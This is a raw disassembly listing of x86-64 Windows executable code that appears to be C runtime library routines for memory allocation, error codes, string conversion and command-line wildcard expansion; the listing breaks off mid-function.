   1400057c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400057c4:	e8 97 fb ff ff       	call   0x140005360
   1400057c9:	48 85 c0             	test   %rax,%rax
   1400057cc:	75 09                	jne    0x1400057d7
   1400057ce:	48 8d 05 7f 18 01 00 	lea    0x1187f(%rip),%rax        # 0x140017054
   1400057d5:	eb 04                	jmp    0x1400057db
   1400057d7:	48 83 c0 20          	add    $0x20,%rax
   1400057db:	48 83 c4 28          	add    $0x28,%rsp
   1400057df:	c3                   	ret
   1400057e0:	40 53                	rex push %rbx
   1400057e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400057e6:	4c 8b c2             	mov    %rdx,%r8
   1400057e9:	48 8b d9             	mov    %rcx,%rbx
   1400057ec:	48 85 c9             	test   %rcx,%rcx
   1400057ef:	74 0e                	je     0x1400057ff
   1400057f1:	33 d2                	xor    %edx,%edx
   1400057f3:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   1400057f7:	48 f7 f3             	div    %rbx
   1400057fa:	49 3b c0             	cmp    %r8,%rax
   1400057fd:	72 43                	jb     0x140005842
   1400057ff:	49 0f af d8          	imul   %r8,%rbx
   140005803:	b8 01 00 00 00       	mov    $0x1,%eax
   140005808:	48 85 db             	test   %rbx,%rbx
   14000580b:	48 0f 44 d8          	cmove  %rax,%rbx
   14000580f:	eb 15                	jmp    0x140005826
   140005811:	e8 5a ee ff ff       	call   0x140004670
   140005816:	85 c0                	test   %eax,%eax
   140005818:	74 28                	je     0x140005842
   14000581a:	48 8b cb             	mov    %rbx,%rcx
   14000581d:	e8 22 35 00 00       	call   0x140008d44
   140005822:	85 c0                	test   %eax,%eax
   140005824:	74 1c                	je     0x140005842
   140005826:	48 8b 0d eb 2d 01 00 	mov    0x12deb(%rip),%rcx        # 0x140018618
   14000582d:	4c 8b c3             	mov    %rbx,%r8
   140005830:	ba 08 00 00 00       	mov    $0x8,%edx
   140005835:	ff 15 05 89 00 00    	call   *0x8905(%rip)        # 0x14000e140
   14000583b:	48 85 c0             	test   %rax,%rax
   14000583e:	74 d1                	je     0x140005811
   140005840:	eb 0d                	jmp    0x14000584f
   140005842:	e8 79 ff ff ff       	call   0x1400057c0
   140005847:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000584d:	33 c0                	xor    %eax,%eax
   14000584f:	48 83 c4 20          	add    $0x20,%rsp
   140005853:	5b                   	pop    %rbx
   140005854:	c3                   	ret
   140005855:	cc                   	int3
   140005856:	cc                   	int3
   140005857:	cc                   	int3
   140005858:	48 85 c9             	test   %rcx,%rcx
   14000585b:	74 37                	je     0x140005894
   14000585d:	53                   	push   %rbx
   14000585e:	48 83 ec 20          	sub    $0x20,%rsp
   140005862:	4c 8b c1             	mov    %rcx,%r8
   140005865:	33 d2                	xor    %edx,%edx
   140005867:	48 8b 0d aa 2d 01 00 	mov    0x12daa(%rip),%rcx        # 0x140018618
   14000586e:	ff 15 d4 88 00 00    	call   *0x88d4(%rip)        # 0x14000e148
   140005874:	85 c0                	test   %eax,%eax
   140005876:	75 17                	jne    0x14000588f
   140005878:	e8 43 ff ff ff       	call   0x1400057c0
   14000587d:	48 8b d8             	mov    %rax,%rbx
   140005880:	ff 15 0a 88 00 00    	call   *0x880a(%rip)        # 0x14000e090
   140005886:	8b c8                	mov    %eax,%ecx
   140005888:	e8 7b fe ff ff       	call   0x140005708
   14000588d:	89 03                	mov    %eax,(%rbx)
   14000588f:	48 83 c4 20          	add    $0x20,%rsp
   140005893:	5b                   	pop    %rbx
   140005894:	c3                   	ret
   140005895:	cc                   	int3
   140005896:	cc                   	int3
   140005897:	cc                   	int3
   140005898:	48 3b ca             	cmp    %rdx,%rcx
   14000589b:	73 04                	jae    0x1400058a1
   14000589d:	83 c8 ff             	or     $0xffffffff,%eax
   1400058a0:	c3                   	ret
   1400058a1:	33 c0                	xor    %eax,%eax
   1400058a3:	48 3b ca             	cmp    %rdx,%rcx
   1400058a6:	0f 97 c0             	seta   %al
   1400058a9:	c3                   	ret
   1400058aa:	cc                   	int3
   1400058ab:	cc                   	int3
   1400058ac:	48 8b c4             	mov    %rsp,%rax
   1400058af:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400058b3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400058b7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400058bb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400058bf:	41 56                	push   %r14
   1400058c1:	48 83 ec 30          	sub    $0x30,%rsp
   1400058c5:	33 db                	xor    %ebx,%ebx
   1400058c7:	41 8b e8             	mov    %r8d,%ebp
   1400058ca:	48 8b fa             	mov    %rdx,%rdi
   1400058cd:	48 8b f1             	mov    %rcx,%rsi
   1400058d0:	48 85 c9             	test   %rcx,%rcx
   1400058d3:	75 22                	jne    0x1400058f7
   1400058d5:	38 5a 28             	cmp    %bl,0x28(%rdx)
   1400058d8:	74 0c                	je     0x1400058e6
   1400058da:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   1400058de:	e8 75 ff ff ff       	call   0x140005858
   1400058e3:	88 5f 28             	mov    %bl,0x28(%rdi)
   1400058e6:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   1400058ea:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   1400058ee:	48 89 5f 20          	mov    %rbx,0x20(%rdi)
   1400058f2:	e9 0e 01 00 00       	jmp    0x140005a05
   1400058f7:	38 19                	cmp    %bl,(%rcx)
   1400058f9:	75 55                	jne    0x140005950
   1400058fb:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   1400058ff:	75 46                	jne    0x140005947
   140005901:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140005904:	74 0c                	je     0x140005912
   140005906:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   14000590a:	e8 49 ff ff ff       	call   0x140005858
   14000590f:	88 5f 28             	mov    %bl,0x28(%rdi)
   140005912:	b9 02 00 00 00       	mov    $0x2,%ecx
   140005917:	e8 34 26 00 00       	call   0x140007f50
   14000591c:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140005920:	48 8b cb             	mov    %rbx,%rcx
   140005923:	48 f7 d8             	neg    %rax
   140005926:	1b d2                	sbb    %edx,%edx
   140005928:	f7 d2                	not    %edx
   14000592a:	83 e2 0c             	and    $0xc,%edx
   14000592d:	0f 94 c1             	sete   %cl
   140005930:	85 d2                	test   %edx,%edx
   140005932:	0f 94 c0             	sete   %al
   140005935:	88 47 28             	mov    %al,0x28(%rdi)
   140005938:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   14000593c:	85 d2                	test   %edx,%edx
   14000593e:	74 07                	je     0x140005947
   140005940:	8b da                	mov    %edx,%ebx
   140005942:	e9 be 00 00 00       	jmp    0x140005a05
   140005947:	48 8b 47 10          	mov    0x10(%rdi),%rax
   14000594b:	66 89 18             	mov    %bx,(%rax)
   14000594e:	eb 9e                	jmp    0x1400058ee
   140005950:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140005954:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140005958:	4c 8b c6             	mov    %rsi,%r8
   14000595b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005960:	8b cd                	mov    %ebp,%ecx
   140005962:	41 8d 51 0a          	lea    0xa(%r9),%edx
   140005966:	e8 11 16 00 00       	call   0x140006f7c
   14000596b:	4c 63 f0             	movslq %eax,%r14
   14000596e:	85 c0                	test   %eax,%eax
   140005970:	75 16                	jne    0x140005988
   140005972:	ff 15 18 87 00 00    	call   *0x8718(%rip)        # 0x14000e090
   140005978:	8b c8                	mov    %eax,%ecx
   14000597a:	e8 d1 fd ff ff       	call   0x140005750
   14000597f:	e8 3c fe ff ff       	call   0x1400057c0
   140005984:	8b 18                	mov    (%rax),%ebx
   140005986:	eb 7d                	jmp    0x140005a05
   140005988:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   14000598c:	4c 3b f1             	cmp    %rcx,%r14
   14000598f:	76 43                	jbe    0x1400059d4
   140005991:	38 5f 28             	cmp    %bl,0x28(%rdi)
   140005994:	74 0c                	je     0x1400059a2
   140005996:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   14000599a:	e8 b9 fe ff ff       	call   0x140005858
   14000599f:	88 5f 28             	mov    %bl,0x28(%rdi)
   1400059a2:	4b 8d 0c 36          	lea    (%r14,%r14,1),%rcx
   1400059a6:	e8 a5 25 00 00       	call   0x140007f50
   1400059ab:	48 89 47 10          	mov    %rax,0x10(%rdi)
   1400059af:	48 8b cb             	mov    %rbx,%rcx
   1400059b2:	48 f7 d8             	neg    %rax
   1400059b5:	1b d2                	sbb    %edx,%edx
   1400059b7:	f7 d2                	not    %edx
   1400059b9:	83 e2 0c             	and    $0xc,%edx
   1400059bc:	49 0f 44 ce          	cmove  %r14,%rcx
   1400059c0:	85 d2                	test   %edx,%edx
   1400059c2:	0f 94 c0             	sete   %al
   1400059c5:	88 47 28             	mov    %al,0x28(%rdi)
   1400059c8:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   1400059cc:	85 d2                	test   %edx,%edx
   1400059ce:	0f 85 6c ff ff ff    	jne    0x140005940
   1400059d4:	48 8b 47 10          	mov    0x10(%rdi),%rax
   1400059d8:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400059dc:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1400059e0:	4c 8b c6             	mov    %rsi,%r8
   1400059e3:	8b cd                	mov    %ebp,%ecx
   1400059e5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400059ea:	41 8d 51 0a          	lea    0xa(%r9),%edx
   1400059ee:	e8 89 15 00 00       	call   0x140006f7c
   1400059f3:	48 63 c8             	movslq %eax,%rcx
   1400059f6:	85 c0                	test   %eax,%eax
   1400059f8:	0f 84 74 ff ff ff    	je     0x140005972
   1400059fe:	48 ff c9             	dec    %rcx
   140005a01:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   140005a05:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140005a0a:	8b c3                	mov    %ebx,%eax
   140005a0c:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005a11:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005a16:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140005a1b:	48 83 c4 30          	add    $0x30,%rsp
   140005a1f:	41 5e                	pop    %r14
   140005a21:	c3                   	ret
   140005a22:	cc                   	int3
   140005a23:	cc                   	int3
   140005a24:	48 8b c4             	mov    %rsp,%rax
   140005a27:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140005a2b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140005a2f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005a33:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140005a37:	41 56                	push   %r14
   140005a39:	48 83 ec 40          	sub    $0x40,%rsp
   140005a3d:	33 db                	xor    %ebx,%ebx
   140005a3f:	45 8b f0             	mov    %r8d,%r14d
   140005a42:	48 8b fa             	mov    %rdx,%rdi
   140005a45:	48 8b f1             	mov    %rcx,%rsi
   140005a48:	48 85 c9             	test   %rcx,%rcx
   140005a4b:	75 22                	jne    0x140005a6f
   140005a4d:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140005a50:	74 0c                	je     0x140005a5e
   140005a52:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140005a56:	e8 fd fd ff ff       	call   0x140005858
   140005a5b:	88 5f 28             	mov    %bl,0x28(%rdi)
   140005a5e:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   140005a62:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   140005a66:	48 89 5f 20          	mov    %rbx,0x20(%rdi)
   140005a6a:	e9 22 01 00 00       	jmp    0x140005b91
   140005a6f:	66 39 19             	cmp    %bx,(%rcx)
   140005a72:	75 54                	jne    0x140005ac8
   140005a74:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   140005a78:	75 46                	jne    0x140005ac0
   140005a7a:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140005a7d:	74 0c                	je     0x140005a8b
   140005a7f:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140005a83:	e8 d0 fd ff ff       	call   0x140005858
   140005a88:	88 5f 28             	mov    %bl,0x28(%rdi)
   140005a8b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005a90:	e8 bb 24 00 00       	call   0x140007f50
   140005a95:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140005a99:	48 8b cb             	mov    %rbx,%rcx
   140005a9c:	48 f7 d8             	neg    %rax
   140005a9f:	1b d2                	sbb    %edx,%edx
   140005aa1:	f7 d2                	not    %edx
   140005aa3:	83 e2 0c             	and    $0xc,%edx
   140005aa6:	0f 94 c1             	sete   %cl
   140005aa9:	85 d2                	test   %edx,%edx
   140005aab:	0f 94 c0             	sete   %al
   140005aae:	88 47 28             	mov    %al,0x28(%rdi)
   140005ab1:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140005ab5:	85 d2                	test   %edx,%edx
   140005ab7:	74 07                	je     0x140005ac0
   140005ab9:	8b da                	mov    %edx,%ebx
   140005abb:	e9 d1 00 00 00       	jmp    0x140005b91
   140005ac0:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140005ac4:	88 18                	mov    %bl,(%rax)
   140005ac6:	eb 9e                	jmp    0x140005a66
   140005ac8:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140005acd:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140005ad1:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140005ad6:	4c 8b c6             	mov    %rsi,%r8
   140005ad9:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140005add:	33 d2                	xor    %edx,%edx
   140005adf:	41 8b ce             	mov    %r14d,%ecx
   140005ae2:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005ae7:	e8 ec 14 00 00       	call   0x140006fd8
   140005aec:	48 63 e8             	movslq %eax,%rbp
   140005aef:	85 c0                	test   %eax,%eax
   140005af1:	75 19                	jne    0x140005b0c
   140005af3:	ff 15 97 85 00 00    	call   *0x8597(%rip)        # 0x14000e090
   140005af9:	8b c8                	mov    %eax,%ecx
   140005afb:	e8 50 fc ff ff       	call   0x140005750
   140005b00:	e8 bb fc ff ff       	call   0x1400057c0
   140005b05:	8b 18                	mov    (%rax),%ebx
   140005b07:	e9 85 00 00 00       	jmp    0x140005b91
   140005b0c:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   140005b10:	48 3b e9             	cmp    %rcx,%rbp
   140005b13:	76 42                	jbe    0x140005b57
   140005b15:	38 5f 28             	cmp    %bl,0x28(%rdi)
   140005b18:	74 0c                	je     0x140005b26
   140005b1a:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   140005b1e:	e8 35 fd ff ff       	call   0x140005858
   140005b23:	88 5f 28             	mov    %bl,0x28(%rdi)
   140005b26:	48 8b cd             	mov    %rbp,%rcx
   140005b29:	e8 22 24 00 00       	call   0x140007f50
   140005b2e:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140005b32:	48 8b cb             	mov    %rbx,%rcx
   140005b35:	48 f7 d8             	neg    %rax
   140005b38:	1b d2                	sbb    %edx,%edx
   140005b3a:	f7 d2                	not    %edx
   140005b3c:	83 e2 0c             	and    $0xc,%edx
   140005b3f:	48 0f 44 cd          	cmove  %rbp,%rcx
   140005b43:	85 d2                	test   %edx,%edx
   140005b45:	0f 94 c0             	sete   %al
   140005b48:	88 47 28             	mov    %al,0x28(%rdi)
   140005b4b:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140005b4f:	85 d2                	test   %edx,%edx
   140005b51:	0f 85 62 ff ff ff    	jne    0x140005ab9
   140005b57:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140005b5b:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140005b5f:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140005b64:	4c 8b c6             	mov    %rsi,%r8
   140005b67:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140005b6c:	33 d2                	xor    %edx,%edx
   140005b6e:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140005b72:	41 8b ce             	mov    %r14d,%ecx
   140005b75:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005b7a:	e8 59 14 00 00       	call   0x140006fd8
   140005b7f:	48 63 c8             	movslq %eax,%rcx
   140005b82:	85 c0                	test   %eax,%eax
   140005b84:	0f 84 69 ff ff ff    	je     0x140005af3
   140005b8a:	48 ff c9             	dec    %rcx
   140005b8d:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   140005b91:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140005b96:	8b c3                	mov    %ebx,%eax
   140005b98:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140005b9d:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140005ba2:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140005ba7:	48 83 c4 40          	add    $0x40,%rsp
   140005bab:	41 5e                	pop    %r14
   140005bad:	c3                   	ret
   140005bae:	cc                   	int3
   140005baf:	cc                   	int3
   140005bb0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005bb5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140005bba:	55                   	push   %rbp
   140005bbb:	56                   	push   %rsi
   140005bbc:	57                   	push   %rdi
   140005bbd:	41 54                	push   %r12
   140005bbf:	41 55                	push   %r13
   140005bc1:	41 56                	push   %r14
   140005bc3:	41 57                	push   %r15
   140005bc5:	48 8b ec             	mov    %rsp,%rbp
   140005bc8:	48 83 ec 60          	sub    $0x60,%rsp
   140005bcc:	33 ff                	xor    %edi,%edi
   140005bce:	48 8b d9             	mov    %rcx,%rbx
   140005bd1:	48 85 d2             	test   %rdx,%rdx
   140005bd4:	75 16                	jne    0x140005bec
   140005bd6:	e8 e5 fb ff ff       	call   0x1400057c0
   140005bdb:	8d 5f 16             	lea    0x16(%rdi),%ebx
   140005bde:	89 18                	mov    %ebx,(%rax)
   140005be0:	e8 bb fa ff ff       	call   0x1400056a0
   140005be5:	8b c3                	mov    %ebx,%eax
   140005be7:	e9 a0 01 00 00       	jmp    0x140005d8c
   140005bec:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005bef:	48 89 3a             	mov    %rdi,(%rdx)
   140005bf2:	48 8b 01             	mov    (%rcx),%rax
   140005bf5:	f3 0f 7f 45 e0       	movdqu %xmm0,-0x20(%rbp)
   140005bfa:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
   140005bfe:	48 85 c0             	test   %rax,%rax
   140005c01:	74 56                	je     0x140005c59
   140005c03:	48 8d 55 50          	lea    0x50(%rbp),%rdx
   140005c07:	66 c7 45 50 2a 3f    	movw   $0x3f2a,0x50(%rbp)
   140005c0d:	48 8b c8             	mov    %rax,%rcx
   140005c10:	40 88 7d 52          	mov    %dil,0x52(%rbp)
   140005c14:	e8 17 40 00 00       	call   0x140009c30
   140005c19:	48 8b 0b             	mov    (%rbx),%rcx
   140005c1c:	48 85 c0             	test   %rax,%rax
   140005c1f:	75 10                	jne    0x140005c31
   140005c21:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140005c25:	45 33 c0             	xor    %r8d,%r8d
   140005c28:	33 d2                	xor    %edx,%edx
   140005c2a:	e8 8d 01 00 00       	call   0x140005dbc
   140005c2f:	eb 0c                	jmp    0x140005c3d
   140005c31:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140005c35:	48 8b d0             	mov    %rax,%rdx
   140005c38:	e8 07 03 00 00       	call   0x140005f44
   140005c3d:	8b f0                	mov    %eax,%esi
   140005c3f:	85 c0                	test   %eax,%eax
   140005c41:	75 09                	jne    0x140005c4c
   140005c43:	48 83 c3 08          	add    $0x8,%rbx
   140005c47:	48 8b 03             	mov    (%rbx),%rax
   140005c4a:	eb b2                	jmp    0x140005bfe
   140005c4c:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   140005c50:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   140005c54:	e9 f8 00 00 00       	jmp    0x140005d51
   140005c59:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   140005c5d:	4c 8b cf             	mov    %rdi,%r9
   140005c60:	4c 8b 65 e8          	mov    -0x18(%rbp),%r12
   140005c64:	49 8b d7             	mov    %r15,%rdx
   140005c67:	49 8b c4             	mov    %r12,%rax
   140005c6a:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   140005c6e:	49 2b c7             	sub    %r15,%rax
   140005c71:	4c 8b c7             	mov    %rdi,%r8
   140005c74:	4c 8b f0             	mov    %rax,%r14
   140005c77:	49 c1 fe 03          	sar    $0x3,%r14
   140005c7b:	49 ff c6             	inc    %r14
   140005c7e:	48 8d 48 07          	lea    0x7(%rax),%rcx
   140005c82:	48 c1 e9 03          	shr    $0x3,%rcx
   140005c86:	4d 3b fc             	cmp    %r12,%r15
   140005c89:	48 0f 47 cf          	cmova  %rdi,%rcx
   140005c8d:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   140005c91:	48 85 c9             	test   %rcx,%rcx
   140005c94:	74 25                	je     0x140005cbb
   140005c96:	4c 8b 12             	mov    (%rdx),%r10
   140005c99:	48 8b c6             	mov    %rsi,%rax
   140005c9c:	48 ff c0             	inc    %rax
   140005c9f:	41 38 3c 02          	cmp    %dil,(%r10,%rax,1)
   140005ca3:	75 f7                	jne    0x140005c9c
   140005ca5:	49 ff c1             	inc    %r9
   140005ca8:	48 83 c2 08          	add    $0x8,%rdx
   140005cac:	4c 03 c8             	add    %rax,%r9
   140005caf:	49 ff c0             	inc    %r8
   140005cb2:	4c 3b c1             	cmp    %rcx,%r8
   140005cb5:	75 df                	jne    0x140005c96
   140005cb7:	4c 89 4d 50          	mov    %r9,0x50(%rbp)
   140005cbb:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140005cc1:	49 8b d1             	mov    %r9,%rdx
   140005cc4:	49 8b ce             	mov    %r14,%rcx
   140005cc7:	e8 10 df ff ff       	call   0x140003bdc
   140005ccc:	48 8b d8             	mov    %rax,%rbx
   140005ccf:	48 85 c0             	test   %rax,%rax
   140005cd2:	74 76                	je     0x140005d4a
   140005cd4:	4a 8d 14 f0          	lea    (%rax,%r14,8),%rdx
   140005cd8:	4d 8b f7             	mov    %r15,%r14
   140005cdb:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140005cdf:	48 8b c2             	mov    %rdx,%rax
   140005ce2:	48 89 55 58          	mov    %rdx,0x58(%rbp)
   140005ce6:	4d 3b fc             	cmp    %r12,%r15
   140005ce9:	74 56                	je     0x140005d41
   140005ceb:	48 8b cb             	mov    %rbx,%rcx
   140005cee:	49 2b cf             	sub    %r15,%rcx
   140005cf1:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   140005cf5:	4d 8b 06             	mov    (%r14),%r8
   140005cf8:	4c 8b ee             	mov    %rsi,%r13
   140005cfb:	49 ff c5             	inc    %r13
   140005cfe:	43 38 3c 28          	cmp    %dil,(%r8,%r13,1)
   140005d02:	75 f7                	jne    0x140005cfb
   140005d04:	48 2b d0             	sub    %rax,%rdx
   140005d07:	49 ff c5             	inc    %r13
   140005d0a:	48 03 55 50          	add    0x50(%rbp),%rdx
   140005d0e:	4d 8b cd             	mov    %r13,%r9
   140005d11:	48 8b c8             	mov    %rax,%rcx
   140005d14:	e8 97 3d 00 00       	call   0x140009ab0
   140005d19:	85 c0                	test   %eax,%eax
   140005d1b:	0f 85 83 00 00 00    	jne    0x140005da4
   140005d21:	48 8b 45 58          	mov    0x58(%rbp),%rax
   140005d25:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   140005d29:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   140005d2d:	4a 89 04 31          	mov    %rax,(%rcx,%r14,1)
   140005d31:	49 03 c5             	add    %r13,%rax
   140005d34:	49 83 c6 08          	add    $0x8,%r14
   140005d38:	48 89 45 58          	mov    %rax,0x58(%rbp)
   140005d3c:	4d 3b f4             	cmp    %r12,%r14
   140005d3f:	75 b4                	jne    0x140005cf5
   140005d41:	48 8b 45 48          	mov    0x48(%rbp),%rax
   140005d45:	8b f7                	mov    %edi,%esi
   140005d47:	48 89 18             	mov    %rbx,(%rax)
   140005d4a:	33 c9                	xor    %ecx,%ecx
   140005d4c:	e8 07 fb ff ff       	call   0x140005858
   140005d51:	49 8b dc             	mov    %r12,%rbx
   140005d54:	4d 8b f7             	mov    %r15,%r14
   140005d57:	49 2b df             	sub    %r15,%rbx
   140005d5a:	48 83 c3 07          	add    $0x7,%rbx
   140005d5e:	48 c1 eb 03          	shr    $0x3,%rbx
   140005d62:	4d 3b fc             	cmp    %r12,%r15
   140005d65:	48 0f 47 df          	cmova  %rdi,%rbx
   140005d69:	48 85 db             	test   %rbx,%rbx
   140005d6c:	74 14                	je     0x140005d82
   140005d6e:	49 8b 0e             	mov    (%r14),%rcx
   140005d71:	e8 e2 fa ff ff       	call   0x140005858
   140005d76:	48 ff c7             	inc    %rdi
   140005d79:	4d 8d 76 08          	lea    0x8(%r14),%r14
   140005d7d:	48 3b fb             	cmp    %rbx,%rdi
   140005d80:	75 ec                	jne    0x140005d6e
   140005d82:	49 8b cf             	mov    %r15,%rcx
   140005d85:	e8 ce fa ff ff       	call   0x140005858
   140005d8a:	8b c6                	mov    %esi,%eax
   140005d8c:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   140005d93:	00 
   140005d94:	48 83 c4 60          	add    $0x60,%rsp
   140005d98:	41 5f                	pop    %r15
   140005d9a:	41 5e                	pop    %r14
   140005d9c:	41 5d                	pop    %r13
   140005d9e:	41 5c                	pop    %r12
   140005da0:	5f                   	pop    %rdi
   140005da1:	5e                   	pop    %rsi
   140005da2:	5d                   	pop    %rbp
   140005da3:	c3                   	ret
   140005da4:	45 33 c9             	xor    %r9d,%r9d
   140005da7:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005dac:	45 33 c0             	xor    %r8d,%r8d
   140005daf:	33 d2                	xor    %edx,%edx
   140005db1:	33 c9                	xor    %ecx,%ecx
   140005db3:	e8 08 f9 ff ff       	call   0x1400056c0
   140005db8:	cc                   	int3
   140005db9:	cc                   	int3
   140005dba:	cc                   	int3
   140005dbb:	cc                   	int3
   140005dbc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005dc1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005dc6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005dcb:	57                   	push   %rdi
   140005dcc:	41 54                	push   %r12
   140005dce:	41 55                	push   %r13
   140005dd0:	41 56                	push   %r14
   140005dd2:	41 57                	push   %r15
   140005dd4:	48 83 ec 30          	sub    $0x30,%rsp
   140005dd8:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140005ddc:	49 8b f9             	mov    %r9,%rdi
   140005ddf:	33 f6                	xor    %esi,%esi
   140005de1:	4d 8b f0             	mov    %r8,%r14
   140005de4:	4c 8b ea             	mov    %rdx,%r13
   140005de7:	4c 8b e1             	mov    %rcx,%r12
   140005dea:	48 ff c5             	inc    %rbp
   140005ded:	40 38 34 29          	cmp    %sil,(%rcx,%rbp,1)
   140005df1:	75 f7                	jne    0x140005dea
   140005df3:	ba 01 00 00 00       	mov    $0x1,%edx
   140005df8:	49 8b c6             	mov    %r14,%rax
   140005dfb:	48 03 ea             	add    %rdx,%rbp
   140005dfe:	48 f7 d0             	not    %rax
   140005e01:	48 3b e8             	cmp    %rax,%rbp
   140005e04:	76 20                	jbe    0x140005e26
   140005e06:	8d 42 0b             	lea    0xb(%rdx),%eax
   140005e09:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005e0e:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140005e13:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140005e18:	48 83 c4 30          	add    $0x30,%rsp
   140005e1c:	41 5f                	pop    %r15
   140005e1e:	41 5e                	pop    %r14
   140005e20:	41 5d                	pop    %r13
   140005e22:	41 5c                	pop    %r12
   140005e24:	5f                   	pop    %rdi
   140005e25:	c3                   	ret
   140005e26:	4d 8d 78 01          	lea    0x1(%r8),%r15
   140005e2a:	4c 03 fd             	add    %rbp,%r15
   140005e2d:	49 8b cf             	mov    %r15,%rcx
   140005e30:	e8 ab f9 ff ff       	call   0x1400057e0
   140005e35:	48 8b d8             	mov    %rax,%rbx
   140005e38:	4d 85 f6             	test   %r14,%r14
   140005e3b:	74 19                	je     0x140005e56
   140005e3d:	4d 8b ce             	mov    %r14,%r9
   140005e40:	4d 8b c5             	mov    %r13,%r8
   140005e43:	49 8b d7             	mov    %r15,%rdx
   140005e46:	48 8b c8             	mov    %rax,%rcx
   140005e49:	e8 62 3c 00 00       	call   0x140009ab0
   140005e4e:	85 c0                	test   %eax,%eax
   140005e50:	0f 85 d8 00 00 00    	jne    0x140005f2e
   140005e56:	4d 2b fe             	sub    %r14,%r15
   140005e59:	4a 8d 0c 33          	lea    (%rbx,%r14,1),%rcx
   140005e5d:	49 8b d7             	mov    %r15,%rdx
   140005e60:	4c 8b cd             	mov    %rbp,%r9
   140005e63:	4d 8b c4             	mov    %r12,%r8
   140005e66:	e8 45 3c 00 00       	call   0x140009ab0
   140005e6b:	85 c0                	test   %eax,%eax
   140005e6d:	0f 85 bb 00 00 00    	jne    0x140005f2e
   140005e73:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
